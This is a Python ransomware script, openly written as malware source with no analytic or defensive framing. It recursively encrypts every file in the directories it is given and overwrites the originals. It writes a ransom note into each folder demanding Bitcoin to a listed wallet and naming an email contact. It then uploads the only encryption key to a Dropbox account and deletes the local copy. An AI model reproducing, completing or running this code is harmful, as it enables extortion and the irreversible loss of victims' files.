import os
import dropbox
from cryptography.fernet import Fernet

# Define your Dropbox access token directly in the script
ACCESS_TOKEN = ''

# Initialize Dropbox client with the token
dbx = dropbox.Dropbox(ACCESS_TOKEN)

# Generate a key and save it
def generate_key(key_file="encryption_key.key"):
    key = Fernet.generate_key()
    with open(key_file, "wb") as keyfile:
        keyfile.write(key)
    print(f"🔑 Encryption key saved to {key_file}")

# Load the encryption key
def load_key(key_file="encryption_key.key"):
    with open(key_file, "rb") as keyfile:
        return keyfile.read()

# Create a ransom note in each directory
def create_ransom_note(directory):
    ransom_note_path = os.path.join(directory, "README_RESTORE_FILES.txt")
    ransom_message = (
        "⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️\n\n"
        "All your important documents, photos, and other files have been encrypted.\n"
        "To restore them, you need to pay a ransom.\n\n"
        "🔓 How to restore your files:\n"
        "1️⃣ Send 0.1 Bitcoin to the following wallet: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH\n"
        "2️⃣ Email proof of payment to hacker@darkweb.com\n"
        "3️⃣ You will receive a decryption key to unlock your files.\n\n"
        "⚠️ WARNING: Attempting to decrypt without the key may result in **permanent data loss**!\n"
    )

    with open(ransom_note_path, "w") as ransom_file:
        ransom_file.write(ransom_message)
    print(f"📄 Ransom note created: {ransom_note_path}")

# Encrypt all files in the specified directories
def encrypt_files(directories, key):
    cipher = Fernet(key)
    for target_dir in directories:
        if not os.path.exists(target_dir):
            print(f"❌ Directory not found: {target_dir}")
            continue

        print(f"\n🔒 Encrypting files in: {target_dir}")
        for root, _, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    # Read the file
                    with open(file_path, "rb") as f:
                        data = f.read()
                    # Encrypt the file
                    encrypted_data = cipher.encrypt(data)
                    # Overwrite the file with encrypted data
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                    print(f"✔ Encrypted: {file_path}")
                except Exception as e:
                    print(f"❌ Failed to encrypt {file_path}: {e}")
        
        # Generate ransom note in each directory
        create_ransom_note(target_dir)

# Upload the encryption key to Dropbox and delete it locally
def upload_key_to_dropbox(key_file="encryption_key.key"):
    # Get the full path to the key file in the current directory
    local_key_path = os.path.join(os.getcwd(), key_file)
    
    if os.path.isfile(local_key_path):
        with open(local_key_path, "rb") as f:
            data = f.read()
            # Upload key to the root of Dropbox ("/" is the root directory)
            dbx.files_upload(data, f"/{key_file}")
        print(f"Uploaded {key_file} successfully to Dropbox!")

        # Delete the key file after uploading
        os.remove(local_key_path)
        print(f"Deleted {key_file} from the local directory.")
    else:
        print(f"Key file {key_file} not found in the current directory.")

if __name__ == "__main__":
    key_file = "encryption_key.key"

    # Generate or load the encryption key
    if not os.path.exists(key_file):
        generate_key(key_file)
    key = load_key(key_file)

    # Get multiple directories from user input
    input_dirs = input("Enter directories to encrypt (comma-separated): ")
    target_directories = [d.strip() for d in input_dirs.split(",")]

    # Encrypt files and generate ransom notes
    encrypt_files(target_directories, key)

    # Upload the encryption key to Dropbox and delete it locally
    upload_key_to_dropbox(key_file)